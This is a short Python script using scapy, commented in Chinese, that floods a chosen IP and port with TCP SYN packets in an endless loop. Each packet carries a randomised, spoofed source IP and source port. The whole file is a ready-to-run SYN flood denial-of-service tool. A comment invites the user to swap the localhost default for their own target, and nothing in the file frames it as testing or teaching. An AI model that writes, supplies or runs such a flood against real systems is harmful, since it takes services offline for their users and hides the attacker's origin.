from scapy.all import *

target_ip = "127.0.0.1"  # 目標伺服器IP，請替換為您的目標IP
target_port = 9999  # 目標伺服器端口

# 無限循環發送SYN封包
while True:
    # 隨機生成源IP
    src_ip = RandIP()
    # 建立IP層
    ip_layer = IP(src=src_ip, dst=target_ip)
    # 建立TCP層
    tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
    # 組合封包
    packet = ip_layer/tcp_layer
    # 發送封包
    send(packet, verbose=False)
